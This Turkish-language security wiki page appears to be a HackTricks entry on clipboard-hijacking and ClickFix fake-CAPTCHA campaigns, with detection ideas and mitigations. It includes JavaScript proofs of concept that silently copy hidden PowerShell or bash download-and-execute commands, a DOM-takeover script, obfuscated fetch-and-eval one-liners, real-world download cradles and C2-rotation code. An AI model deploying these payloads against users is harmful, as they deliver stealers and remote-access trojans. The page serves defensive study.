# Clipboard Hijacking (Pastejacking) Attacks

{{#include ../../banners/hacktricks-training.md}}

> "Kendiniz kopyalamadığınız hiçbir şeyi asla yapıştırmayın." – eski ama hâlâ geçerli bir tavsiye

## Genel Bakış

Clipboard hijacking – *pastejacking* olarak da bilinir – kullanıcıların komutları incelemeden rutin olarak kopyalayıp yapıştırmasından yararlanır. Kötü amaçlı bir web sayfası (veya Electron ya da Desktop uygulaması gibi JavaScript çalıştırabilen herhangi bir ortam), saldırganın kontrolündeki metni programlı olarak sistem panosuna yerleştirir. Kurbanlar, genellikle özenle hazırlanmış social-engineering talimatlarıyla, **Win + R** (Çalıştır iletişim kutusu), **Win + X** (Hızlı Erişim / PowerShell) tuşlarına basmaya veya bir terminal açıp panodaki içeriği *yapıştırmaya* teşvik edilir; böylece rastgele komutlar anında çalıştırılır.

**Hiçbir dosya indirilmediği ve hiçbir ek açılmadığı** için bu teknik, ekleri, makroları veya doğrudan komut çalıştırmayı izleyen e-posta ve web içeriği güvenlik kontrollerinin çoğunu aşar. Bu nedenle saldırı, NetSupport RAT, Latrodectus loader veya Lumma Stealer gibi yaygın malware ailelerini dağıtan phishing kampanyalarında popülerdir.<sup>[[1]](#references)</sup>

## Cüzdan adreslerini değiştiren clipper'lar

Clipboard hijacking'in bir başka türü hiç komut yapıştırmaz: kurbanın bir **cryptocurrency cüzdan adresini** kopyalamasını bekler, ardından yapıştırmadan hemen önce adresi sessizce saldırganın kontrolündeki bir adresle değiştirir. Bu yöntem, özellikle uzun cüzdan biçimlerinde etkilidir; çünkü kullanıcılar çoğu zaman yalnızca ilk ve son karakterleri kontrol eder.<sup>[[8]](#references)</sup>

Yaygın gerçek dünya özellikleri:
- **İnce loader + iç içe payload**: Görünür uygulama/exe, meşru bir alım satım veya "kâr" aracı gibi görünürken gerçek clipper paketin daha derinlerinde gizlidir (örneğin, iç içe bir Rust payload başlatan bir .NET loader).
- **Regex tabanlı değiştirme**: Malware, `bc1...`, `1...`, `3...`, `0x...`, `addr1...`, `DdzFF...`, `ltc...`, `T...`, `r...` gibi dizelerle, hatta genel **44 karakterli Solana benzeri** dizelerle eşleşir ve bunları saldırganın cüzdan adresleriyle değiştirir.
- **Ölçekli cüzdan rotasyonu**: Modern Windows örnekleri, her hırsızlıktan sonra cüzdan itibarının zarar görmesini azaltmak için tek bir sabit adres yerine para birimi başına **binlerce** değiştirme adresi içerebilir.<sup>[[8]](#references)</sup>

### Windows clipper akışı

Yaygın bir uygulama, **`AddClipboardFormatListener`** ile kaydedilmiş gizli bir penceredir. Her pano güncellemesinde malware genellikle şunları çağırır:<sup>[[8]](#references)</sup>
- **`OpenClipboard`** → mevcut pano verilerine erişir.
- **`GetClipboardData`** → metni okur.
- **`EmptyClipboard`** + **`SetClipboardData`** → cüzdan dizesini saldırganın değeriyle değiştirir.

Clippers'da sıkça görülen minimal hunting regex'leri:

```regex
\b(bc1)[A-Za-z0-9]{26,45}\b
\b(1)[A-Za-z0-9]{26,35}\b
\b(3)[A-Za-z0-9]{26,35}\b
\b(0x)[A-Za-z0-9]{40,46}\b
\b(addr1)[A-Za-z0-9]{26,108}\b
\b[A-Za-z0-9]{44}\b
```

Kullanıcı düzeyinde persistence, etki yaratmak için yeterlidir. Gözlemlenen örüntülerden biri şöyledir:<sup>[[8]](#references)</sup>
- Payload'ı **`%APPDATA%\silke\silke.exe`** konumuna kopyalama
- `%APPDATA%\Microsoft\Windows\Start Menu\Programs\Startup\` altında bir **Startup-folder LNK** oluşturma

Tespit fikirleri:
- Clipboard API'lerini sürekli çağırırken aynı zamanda `%APPDATA%` ve kullanıcının **Startup** klasörüne yazan işlemler.
- Cüzdan adreslerinin clipboard'da yeniden yazılmasını takip eden yeni LNK/executable oluşturulması.
- Çok sayıda kullanılmayan dosya içeren arşivler veya sahte yazılım paketleri ve iç içe bir binary başlatan küçük bir launcher.

### macOS'te sosyal mühendislikle quarantine kaldırma + LaunchAgent persistence

macOS'te bazı kampanyalar bir **`unlocker.command`** yardımcı programı sunar ve Gatekeeper uygulamanın hasarlı olduğunu veya tanımlanamayan bir geliştiriciden geldiğini söylerse kurbana sağ tıklayıp **Open**'ı seçmesini söyler. Script yalnızca quarantine'i kaldırır ve yakındaki `.app` dosyasını başlatır:<sup>[[8]](#references)</sup>

```bash
/usr/bin/xattr -cr "$chosen"
/usr/bin/open "$chosen"
```

Bu bir **Gatekeeper exploit’i değildir**; `com.apple.quarantine` xattr’ının Gatekeeper kararlarını etkilediği gerçeğini istismar eden, **sosyal mühendislikle gerçekleştirilen bir karantina atlatma yöntemidir**.<sup>[[8]](#references)</sup>

Çalıştırıldıktan sonra clipper, aşağıdakileri yazarak mevcut kullanıcı olarak kalıcılık sağlayabilir:<sup>[[8]](#references)</sup>
- **`~/launch.sh`** – wrapper script
- **`~/Library/LaunchAgents/com.example..plist`** – `RunAtLoad` ve `KeepAlive` kullanan LaunchAgent

Savunma açısından önemli bir ayrıntı: Bazı örneklerde, LaunchAgent’ı ve wrapper’ı yaklaşık her 30 saniyede bir yeniden yazan bir **kendi kendini onaran watchdog** bulunur. Çalışan süreci sonlandırmadan önce plist’i kaldırırsanız, malware onu hemen yeniden oluşturabilir.<sup>[[8]](#references)</sup> Güvenli temizleme sırası:
1. Etkin clipper sürecini sonlandırın.
2. LaunchAgent plist’ini unload edin/silin.
3. `~/launch.sh` dosyasını ve kopyalanan payload’ı silin.

### Dağıtım notu: sahte itibarın güç çarpanı olarak kullanılması

Bu ailede malware’in kendisi teknik açıdan basit kalabilir; asıl işi **dağıtım katmanı** üstlenir: Sahte GitHub yıldızları/fork’ları, SourceForge yorumları/indirmeleri, YouTube eğitim yorumları/izlenmeleri ve zararsız görünen VirusTotal yorumları/oyları, çalıştırılmadan önce binary’nin güvenilir görünmesini sağlamak için kullanılır.<sup>[[8]](#references)</sup>

## Zorunlu kopyalama düğmeleri ve gizli payload’lar (macOS tek satırlık komutları)

Bazı macOS infostealer’ları, yükleyici sitelerini (ör. Homebrew) klonlar ve kullanıcıların yalnızca görünen metni seçmesini engellemek için **“Copy” düğmesinin kullanılmasını zorunlu kılar**. Panodaki içerik, beklenen yükleyici komutuna eklenmiş bir Base64 payload’ı içerir (ör. `...; echo <b64> | base64 -d | sh`); böylece arayüz ek aşamayı gizlerken tek bir yapıştırma her ikisini de çalıştırır.<sup>[[5]](#references)</sup>

## JavaScript Kavram Kanıtı

```html
<!-- Any user interaction (click) is enough to grant clipboard write permission in modern browsers -->
<button id="fix" onclick="copyPayload()">Fix the error</button>
<script>
function copyPayload() {
  const payload = `powershell -nop -w hidden -enc <BASE64-PS1>`; // hidden PowerShell one-liner
  navigator.clipboard.writeText(payload)
    .then(() => alert('Now press  Win+R , paste and hit Enter to fix the problem.'));
}
</script>
```

Older campaigns `document.execCommand('copy')` kullanıyordu; daha yenileri asenkron **Clipboard API**’ye (`navigator.clipboard.writeText`) dayanıyor.<sup>[[2]](#references)</sup>

## ClickFix / ClearFake Akışı

1. Kullanıcı typosquatting uygulanmış veya ele geçirilmiş bir siteyi ziyaret eder (ör. `docusign.sa[.]com`)
2. Enjekte edilmiş **ClearFake** JavaScript’i, Base64 ile kodlanmış bir PowerShell one-liner’ını sessizce panoya kaydeden `unsecuredCopyToClipboard()` yardımcı işlevini çağırır.
3. HTML talimatları kurbana şunu söyler: *“Sorunu çözmek için **Win + R** tuşlarına basın, komutu yapıştırın ve Enter’a basın.”*
4. `powershell.exe` çalışır ve meşru bir yürütülebilir dosya ile kötü amaçlı bir DLL içeren bir arşiv indirir (klasik DLL sideloading).
5. Loader ek aşamaların şifresini çözer, shellcode enjekte eder ve kalıcılık sağlar (ör. zamanlanmış görev) – sonuçta NetSupport RAT / Latrodectus / Lumma Stealer çalıştırılır.<sup>[[1]](#references)</sup>

### Örnek NetSupport RAT Zinciri

```powershell
powershell -nop -w hidden -enc <Base64>
# ↓ Decodes to:
Invoke-WebRequest -Uri https://evil.site/f.zip -OutFile %TEMP%\f.zip ;
Expand-Archive %TEMP%\f.zip -DestinationPath %TEMP%\f ;
%TEMP%\f\jp2launcher.exe             # Sideloads msvcp140.dll
```

* `jp2launcher.exe` (meşru Java WebStart), bulunduğu dizinde `msvcp140.dll` dosyasını arar.
* Kötü amaçlı DLL, **GetProcAddress** ile API’leri dinamik olarak çözümler, **curl.exe** aracılığıyla iki binary indirir (`data_3.bin`, `data_4.bin`), bunların şifresini kayan XOR anahtarı `"https://google.com/"` ile çözer, son shellcode’u enjekte eder ve **client32.exe** (NetSupport RAT) dosyasını `C:\ProgramData\SecurityCheck_v1\` konumuna açar.<sup>[[1]](#references)</sup>

### Latrodectus Loader

```
powershell -nop -enc <Base64>  # Cloud Identificator: 2031
```

1. **curl.exe** ile `la.txt` dosyasını indirir
2. JScript downloader'ı **cscript.exe** içinde çalıştırır
3. Bir MSI payload'ı getirir → imzalı bir uygulamanın yanına `libcef.dll` bırakır → DLL sideloading → shellcode → Latrodectus.<sup>[[1]](#references)</sup>

### MSHTA üzerinden Lumma Stealer

```
mshta https://iplogger.co/xxxx =+\\xxx
```

**mshta** çağrısı, `PartyContinued.exe` dosyasını indiren, `Boat.pst` (CAB) dosyasını çıkaran, `extrac32` ve dosya birleştirme yoluyla `AutoIt3.exe` dosyasını yeniden oluşturan ve son olarak tarayıcı kimlik bilgilerini `sumeriavgv.digital` adresine sızdıran bir `.a3x` betiğini çalıştıran gizli bir PowerShell betiği başlatır.<sup>[[1]](#references)</sup>

## ClickFix: Pano → PowerShell → JS eval → Dönen C2 ile Başlangıç LNK'si (PureHVNC)

Bazı ClickFix kampanyaları dosya indirmeyi tamamen atlar ve kurbanlara WSH üzerinden JavaScript'i alıp çalıştıran, kalıcılık sağlayan ve C2'yi her gün değiştiren tek satırlık bir komut yapıştırmalarını söyler. Gözlemlenen örnek zincir:<sup>[[3]](#references)</sup>

```powershell
powershell -c "$j=$env:TEMP+'\a.js';sc $j 'a=new 
ActiveXObject(\"MSXML2.XMLHTTP\");a.open(\"GET\",\"63381ba/kcilc.ellrafdlucolc//:sptth\".split(\"\").reverse().join(\"\"),0);a.send();eval(a.responseText);';wscript $j" Prеss Entеr
```

Temel özellikler
- Casual inspection'ı engellemek için obfuscate edilmiş URL runtime'da tersine çevrilir.
- JavaScript, bir Startup LNK (WScript/CScript) aracılığıyla kendini kalıcı hale getirir ve C2'yi geçerli güne göre seçerek domain'lerin hızla rotasyona girmesini sağlar.<sup>[[3]](#references)</sup>

C2'leri tarihe göre rotasyona sokmak için kullanılan minimal JS parçası:<sup>[[3]](#references)</sup>
```js
function getURL() {
    var C2_domain_list = ['stathub.quest','stategiq.quest','mktblend.monster','dsgnfwd.xyz','dndhub.xyz'];
    var current_datetime = new Date().getTime();
    var no_days = getDaysDiff(0, current_datetime);
    return 'https://'
        + getListElement(C2_domain_list, no_days)
        + '/Y/?t=' + current_datetime
        + '&v=5&p=' + encodeURIComponent(user_name + '_' + pc_name + '_' + first_infection_datetime);
}
```

Sonraki aşamada genellikle persistence sağlayan ve bir RAT (ör. PureHVNC) indiren bir loader devreye alınır; bu loader çoğu zaman TLS bağlantısını hardcoded bir sertifikaya sabitler ve trafiği parçalara böler.<sup>[[3]](#references)</sup>

Bu varyanta özgü tespit fikirleri
- Process tree: `explorer.exe` → `powershell.exe -c` → `wscript.exe <temp>\a.js` (veya `cscript.exe`).
- Startup artefact'ları: `%APPDATA%\Microsoft\Windows\Start Menu\Programs\Startup` altında, `%TEMP%`/`%APPDATA%` içindeki bir JS yoluyla WScript/CScript'i çalıştıran LNK.
- `.split('').reverse().join('')` veya `eval(a.responseText)` içeren Registry/RunMRU ve komut satırı telemetrisi.
- Uzun komut satırları kullanmadan uzun script'leri aktarmak için büyük stdin payload'larıyla yinelenen `powershell -NoProfile -NonInteractive -Command -` çağrıları.
- Daha sonra `regsvr32 /s /i:--type=renderer "%APPDATA%\Microsoft\SystemCertificates\<name>.dll"` gibi LOLBin'leri, updater'ı andıran bir görev/yol altında çalıştıran Scheduled Task'lar (ör. `\GoogleSystem\GoogleUpdater`).

Tehdit avı
- Günlük olarak değişen C2 hostname'leri ve `.../Y/?t=<epoch>&v=5&p=<encoded_user_pc_firstinfection>` kalıbındaki URL'ler.
- Clipboard yazma olaylarını, ardından gelen Win+R yapıştırma işlemiyle ve hemen sonrasındaki `powershell.exe` çalıştırmasıyla ilişkilendirin.

Blue team'ler, pastejacking saldırılarını tespit etmek için clipboard, process-creation ve registry telemetrisini birleştirebilir:

* Windows Registry: `HKCU\Software\Microsoft\Windows\CurrentVersion\Explorer\RunMRU`, **Win + R** komutlarının geçmişini tutar – şüpheli Base64 / obfuscated kayıtları arayın.
* **4688** Security Event ID (Process Creation): `ParentImage` == `explorer.exe` ve `NewProcessName` ∈ { `powershell.exe`, `wscript.exe`, `mshta.exe`, `curl.exe`, `cmd.exe` }.
* Şüpheli 4688 olayından hemen önce `%LocalAppData%\Microsoft\Windows\WinX\` veya geçici klasörlerde dosya oluşturulmasını gösteren **4663** Event ID.
* EDR clipboard sensörleri (varsa) – `Clipboard Write` olayını hemen ardından başlayan yeni bir PowerShell süreciyle ilişkilendirin.

## IUAM tarzı doğrulama sayfaları (ClickFix Generator): clipboard'dan konsola kopyalama + işletim sistemine özel payload'lar

Yakın tarihli kampanyalarda, kullanıcıları işletim sistemine özel komutları clipboard'dan yerel konsollara kopyalamaya zorlayan sahte CDN/tarayıcı doğrulama sayfaları ("Just a moment…", IUAM tarzı) toplu olarak üretiliyor. Bu yöntem çalıştırmayı tarayıcı sandbox'ının dışına taşır ve hem Windows hem de macOS'ta çalışır.<sup>[[4]](#references)</sup>

Builder tarafından oluşturulan sayfaların temel özellikleri
- Payload'ları uyarlamak için `navigator.userAgent` üzerinden işletim sistemi tespiti (Windows PowerShell/CMD ile macOS Terminal). Yanılsamayı sürdürmek için desteklenmeyen işletim sistemlerinde isteğe bağlı decoy/no-op'lar.
- Zararsız kullanıcı arayüzü eylemlerinde (checkbox/Copy) otomatik clipboard kopyalama; görünen metin clipboard içeriğinden farklı olabilir.
- Mobil cihazları engelleme ve adım adım talimatlar içeren bir popover: Windows → Win+R→yapıştır→Enter; macOS → Terminal'i aç→yapıştır→Enter.
- İsteğe bağlı obfuscation ve ele geçirilmiş bir sitenin DOM'unu Tailwind biçimlendirmeli bir doğrulama arayüzüyle değiştiren tek dosyalı injector (yeni domain kaydı gerekmez).<sup>[[4]](#references)</sup>

Örnek: clipboard uyuşmazlığı + işletim sistemine duyarlı dallanma
```html
<div class="space-y-2">
  <label class="inline-flex items-center space-x-2">
    <input id="chk" type="checkbox" class="accent-blue-600"> <span>I am human</span>
  </label>
  <div id="tip" class="text-xs text-gray-500">If the copy fails, click the checkbox again.</div>
</div>
<script>
const ua = navigator.userAgent;
const isWin = ua.includes('Windows');
const isMac = /Mac|Macintosh|Mac OS X/.test(ua);
const psWin = `powershell -nop -w hidden -c "iwr -useb https://example[.]com/cv.bat|iex"`;
const shMac = `nohup bash -lc 'curl -fsSL https://example[.]com/p | base64 -d | bash' >/dev/null 2>&1 &`;
const shown = 'copy this: echo ok';            // benign-looking string on screen
const real = isWin ? psWin : (isMac ? shMac : 'echo ok');

function copyReal() {
  // UI shows a harmless string, but clipboard gets the real command
  navigator.clipboard.writeText(real).then(()=>{
    document.getElementById('tip').textContent = 'Now press Win+R (or open Terminal on macOS), paste and hit Enter.';
  });
}

document.getElementById('chk').addEventListener('click', copyReal);
</script>
```

macOS'ta ilk çalıştırmanın kalıcılığı
- Terminal kapandıktan sonra da yürütmenin sürmesi ve görünür izlerin azalması için `nohup bash -lc '<fetch | base64 -d | bash>' >/dev/null 2>&1 &` kullanın.<sup>[[4]](#references)</sup>

Ele geçirilmiş sitelerde sayfanın yerinde devralınması
```html
<script>
(async () => {
  const html = await (await fetch('https://attacker[.]tld/clickfix.html')).text();
  document.documentElement.innerHTML = html;                 // overwrite DOM
  const s = document.createElement('script');
  s.src = 'https://cdn.tailwindcss.com';                     // apply Tailwind styles
  document.head.appendChild(s);
})();
</script>
```

IUAM tarzı tuzaklara özgü tespit ve avlama fikirleri
- Web: Clipboard API'yi doğrulama widget'larına bağlayan sayfalar; görüntülenen metin ile pano içeriğinin uyuşmaması; `navigator.userAgent` üzerinden dallanma; şüpheli bağlamlarda Tailwind + tek sayfalık içerik değişimi.
- Windows endpoint: Tarayıcı etkileşiminden kısa süre sonra `explorer.exe` → `powershell.exe`/`cmd.exe` çalışması; `%TEMP%` konumundan yürütülen batch/MSI yükleyicileri.
- macOS endpoint: Tarayıcı olayları yakınında Terminal/iTerm'in `bash`/`curl`/`base64 -d` çalıştırması ve `nohup` kullanması; terminal kapandıktan sonra da çalışan arka plan işleri.
- `RunMRU` Win+R geçmişini ve pano yazma işlemlerini, ardından oluşturulan konsol süreçleriyle ilişkilendirin.

Destekleyici teknikler için ayrıca bkz.

{{#ref}}
clone-a-website.md
{{#endref}}

{{#ref}}
homograph-attacks.md
{{#endref}}

## 2026'da sahte CAPTCHA / ClickFix gelişmeleri (ClearFake, Scarlet Goldfinch)

- ClearFake, WordPress sitelerini ele geçirmeye ve güncel tuzak mantığını çekmek için harici sunucuları (Cloudflare Workers, GitHub/jsDelivr) ve hatta blockchain “etherhiding” çağrılarını (ör. `bsc-testnet.drpc[.]org` gibi Binance Smart Chain API uç noktalarına POST istekleri) zincirleyen loader JavaScript kodu enjekte etmeye devam ediyor. Son dönem kaplamalarda, kullanıcıları bir şey indirmek yerine tek satırlık komut kopyalayıp yapıştırmaya yönlendiren sahte CAPTCHA'lar (T1204.004) yoğun olarak kullanılıyor.<sup>[[6]](#references)</sup>
- İlk çalıştırma giderek daha fazla imzalı script host'larına/LOLBAS'a devrediliyor. Ocak 2026 zincirlerinde, daha önce kullanılan `mshta` yerine yerleşik `SyncAppvPublishingServer.vbs` kullanıldı; bu betik `WScript.exe` üzerinden çalıştırılıyor ve uzak içeriği getirmek için PowerShell benzeri argümanlar, takma adlar ve joker karakterler kullanıyor:<sup>[[6]](#references)</sup>

```cmd
"C:\WINDOWS\System32\WScript.exe" "C:\WINDOWS\system32\SyncAppvPublishingServer.vbs" "n;&(gal i*x)(&(gcm *stM*) 'cdn.jsdelivr[.]net/gh/grading-chatter-dock73/vigilant-bucket-gui/p1lot')"
```

  - `SyncAppvPublishingServer.vbs` imzalıdır ve normalde App-V tarafından kullanılır; `WScript.exe` ve sıra dışı argümanlarla (`gal`/`gcm` alias’ları, wildcard içeren cmdlet’ler, jsDelivr URL’leri) birlikte kullanıldığında ClearFake için yüksek sinyalli bir LOLBAS aşamasına dönüşür.<sup>[[6]](#references)</sup>
- Şubat 2026’daki sahte CAPTCHA payload’ları yeniden saf PowerShell indirme zincirlerine yöneldi. İki canlı örnek:<sup>[[6]](#references)</sup>

```powershell
"C:\Windows\system32\WindowsPowerShell\v1.0\PowerShell.exe" -c iex(irm 158.94.209[.]33 -UseBasicParsing)
"C:\Windows\system32\WindowsPowerShell\v1.0\PowerShell.exe" -w h -c "$w=New-Object -ComObject WinHttp.WinHttpRequest.5.1;$w.Open('GET','https[:]//cdn[.]jsdelivr[.]net/gh/www1day7/msdn/fase32',0);$w.Send();$f=$env:TEMP+'\FVL.ps1';$w.ResponseText>$f;powershell -w h -ep bypass -f $f"
```

  - İlk zincir, bellek içi bir `iex(irm ...)` grabber'dır; ikincisi `WinHttp.WinHttpRequest.5.1` aracılığıyla aşamalandırma yapar, geçici bir `.ps1` yazar ve ardından gizli bir pencerede `-ep bypass` ile başlatır.<sup>[[6]](#references)</sup>

Bu varyantlar için tespit/avlama ipuçları
- Süreç hiyerarşisi: tarayıcı → `explorer.exe` → pano yazma/Win+R işlemlerinin hemen ardından `wscript.exe ...SyncAppvPublishingServer.vbs` veya PowerShell cradles.
- Komut satırı anahtar sözcükleri: `SyncAppvPublishingServer.vbs`, `WinHttp.WinHttpRequest.5.1`, `-UseBasicParsing`, `%TEMP%\FVL.ps1`, jsDelivr/GitHub/Cloudflare Worker etki alanları veya ham IP kullanan `iex(irm ...)` kalıpları.
- Ağ: web gezintisinden kısa süre sonra script host'larından/PowerShell'den CDN worker host'larına veya blockchain RPC uç noktalarına giden trafik.
- Dosya/kayıt defteri: `%TEMP%` altında geçici `.ps1` oluşturulması ve bu tek satırlı komutları içeren RunMRU girdileri; harici URL'lerle veya gizlenmiş takma ad dizeleriyle çalışan imzalı script LOLBAS'ları (WScript/cscript/mshta) engelleyin/uyarı oluşturun.

## Haziran 2026 ClickFix tradecraft: yapıştırma telemetrisi, sahte doğrulama yorumları ve LOLBin zincirleme

Red Canary'nin yakın tarihli telemetrisi, istikrarlı göstergenin **tek bir kesin komut olmadığını**; bunun yerine **kullanıcı yardımıyla yapıştırıp çalıştırma**, **güvenilir yorumlayıcılar/LOLBin'ler**, **gizlenmiş bayraklar**, **uzaktan alma** ve **anında çalıştırma** bileşiminin belirleyici olduğunu gösteriyor.<sup>[[7]](#references)</sup>

### Dikkat çeken operatör kalıpları

- **Yapıştırma onayı telemetrisi**: bazı payload'lar gerçek aşamadan önce `curl -fsS -4 --connect-timeout 5 --max-time 10 -X POST ... /api/metrics/run?event=pasted` komutunu çağırır. Bu, pencereyi kısa ve sessiz tutarken kullanıcı etkileşimini doğrular.
- **Sahte doğrulama yorumları**: PowerShell tek satırlı komutlarının sonuna `# Security check ✔️ I'm not a robot Verification ID: 138105` gibi dizeler eklenebilir; böylece komut Run / `cmd.exe` / PowerShell geçmişine yapıştırıldıktan sonra CAPTCHA ile ilgiliymiş gibi görünmeye devam eder.
- **Dinamik URL oluşturma**: `iex(irm(('ccud'+'mcx')+('.x'+'yz/u')))` komut satırında sabit bir URL bulunmasını önlerken bellek içi indirme ve çalıştırma işlemini yine de gerçekleştirir.
- **Kamufle edilmiş yükleyici çalıştırma**: `"C:\WINDOWS\system32\msIeXec.exe" -PAcKᵃGE http://... /Q`, kırılgan tespit mekanizmalarını atlatmak için bayraklarda alışılmadık büyük/küçük harf kullanımı ve Unicode benzeri karakterlerden yararlanırken yine de `msiexec.exe`'ye benzer.
- **Şapka karakteriyle kaçış uygulanmış LOLBin zincirleri**: `cmd.exe`, anahtar sözcükleri `^` kaçışlarıyla gizleyebilir (`s^t^a^r^t`, `^c^u^r^l^`, `^m^s^h^t^a^`), iç içe kabuğu küçültülmüş olarak başlatabilir, saldırgan içeriği `.pdf` gibi zararsız bir uzantıyla kaydedebilir ve ardından `mshta` üzerinden çalıştırabilir.<sup>[[7]](#references)</sup>
## Azaltma

1. Tarayıcıyı güçlendirme – pano yazma erişimini devre dışı bırakın (`dom.events.asyncClipboard.clipboardItem` vb.) veya kullanıcı hareketi gerektirin.
2. Güvenlik farkındalığı – kullanıcılara hassas komutları *yazmalarını* veya önce bir metin düzenleyiciye yapıştırmalarını öğretin.
3. PowerShell Constrained Language Mode / Execution Policy ve Application Control kullanarak rastgele tek satırlı komutları engelleyin.
4. Ağ denetimleri – bilinen pastejacking ve malware C2 etki alanlarına giden istekleri engelleyin.

## İlgili Teknikler

* **Discord Invite Hijacking**, kullanıcıları kötü amaçlı bir sunucuya çekerek genellikle aynı ClickFix yaklaşımını kötüye kullanır:
  
{{#ref}}
  discord-invite-hijacking.md
  {{#endref}}

## References

- [1] [ClickFix saldırı vektörünü önleme](https://unit42.paloaltonetworks.com/preventing-clickfix-attack-vector/)
- [2] [Pastejacking PoC – GitHub](https://github.com/dxa4481/Pastejacking)
- [3] [Check Point Research – Saf Perdenin Ardında: RAT'ten Builder'a, Oradan Coder'a](https://research.checkpoint.com/2025/under-the-pure-curtain-from-rat-to-builder-to-coder/)
- [4] [ClickFix Fabrikası: IUAM ClickFix Generator'ün İlk Kez Ortaya Çıkarılması](https://unit42.paloaltonetworks.com/clickfix-generator-first-of-its-kind/)
- [5] [2025, Infostealer yılı](https://www.pentestpartners.com/security-blog/2025-the-year-of-the-infostealer/)
- [6] [Red Canary – İstihbarat İçgörüleri: Şubat 2026](https://redcanary.com/blog/threat-intelligence/intelligence-insights-february-2026/)
- [7] [Red Canary – İstihbarat İçgörüleri: Haziran 2026](https://redcanary.com/blog/threat-intelligence/intelligence-insights-june-2026/)
- [8] [Check Point Research – Yıldızlardan Olumlu Oylarına: Sahte İtibarın Bir Kripto Pano Korsanına Güç Vermesi](https://research.checkpoint.com/2026/from-stars-to-upvotes-fake-reputation-fueling-a-crypto-clipboard-hijacker/)
{{#include ../../banners/hacktricks-training.md}}
